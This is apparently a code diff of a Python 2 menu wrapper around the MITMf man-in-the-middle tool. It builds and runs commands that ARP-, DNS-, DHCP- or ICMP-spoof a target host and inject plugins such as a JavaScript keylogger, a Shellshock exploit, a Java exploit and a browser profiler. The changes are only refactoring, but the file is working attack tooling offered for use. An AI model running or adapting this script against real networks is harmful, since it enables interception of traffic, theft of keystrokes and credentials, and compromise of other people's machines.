@@ -52,20 +52,14 @@ def FigureOutHowToAttack():
 	print"|1. Run prebuilt attack from a menu selection.                    |"
 	print"|2. Build your own attack by selecting the options form a menu.   |"
 	print"|_________________________________________________________________|"
-	
-	try:
-		WhatToRun=raw_input("Select the menu number for how you want to conduct your attack:")
-		if WhatToRun == '1':
-			MainAttackMenu()
-		elif WhatToRun == '2':
-			CustomeMenuAttackStringBUild()
-		else:
-			print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
-			FigureOutHowToAttack()
-	except:
-		FigureOutHowToAttack()	
+	WhatToRun=raw_input("Select the menu number for how you want to conduct your attack:")
+	if WhatToRun == '1':
+		MainAttackMenu()
+	elif WhatToRun == '2':
+		CustomeMenuAttackStringBUild()
+	else:
 		print"THATS NOT A VALID INPUT! Pick 1 or 2 nothing else!"
-	print "Exit wrapper time mhow"
+		FigureOutHowToAttack()	
 	
 def WriteMenuOptions():
     os.system("clear")
@@ -81,6 +75,7 @@ def MainAttackMenu():
 	while True:
 		WriteMenuOptions()
 		menuOption=raw_input("Please type your selection:")
+		
 		if menuOption=="1":
 			os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip)
 			break
@@ -121,48 +116,48 @@ def ShowCustomeBuildMenu():
 	print"    |_______________________________________|"
 
 def CustomeMenuAttackStringBUild():	
-	#options 1-5 = var firstHalf
-	#6-11 =var lastHalf
-	#BASE STATEMENT os.system("mitmf -i "+interface + " "+ firstHalf + " "+ gateway + " --target "+ip+ " "+lastHalf)
+	firstHalf=""
+	lastHalf=""
 	ShowCustomeBuildMenu()
 	count=0
-	while (count < 20):
+	while (count <20):
 		MenuSelection=raw_input("Please type your selection (type q when done):")
-		if MenuSelection == '1':
+		if MenuSelection == "1":
 			firstHalf +=" --arp"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '2':
+		elif MenuSelection == "2":
 			firstHalf +=" --dns"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '3':
+		elif MenuSelection == "3":
 			firstHalf +=" --spoof"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '4':
+		elif MenuSelection == "4":
 			firstHalf +=" --dhcp"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '5':
+		elif MenuSelection == "5":
 			firstHalf +=" --icmp"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '6':
+		elif MenuSelection == "6":
 			lastHalf +=" --shellshock"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '7':
+		elif MenuSelection == "7":
 			lastHalf +=" --jskeylogger"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '8':
+		elif MenuSelection == "8":
 			lastHalf +=" --browserprofiler"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == '9':
+		elif MenuSelection == "9":
 			lastHalf +=" --javapwn"
 			print("\nYOUR COMMAND LOOKS LIKE: \'mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
-		elif MenuSelection == 'q': 
+		elif MenuSelection == "q": 
 			break
 		else:
 			print"What tha **** did you just enter?!"
-		count=count+1		
+		count=count+1
+			
 	if len(firstHalf)==0 and len(lastHalf)==0:
 		os.system("clear")
-		print "Incomplete command. Retry..."
+		print "\nIncomplete command. Retry...\n"
 		CustomeMenuAttackStringBUild()
 	else:
 		os.system("mitmf -i "+interface + " "+ firstHalf + " --gateway "+ gateway + " --target "+ip+ " "+lastHalf)
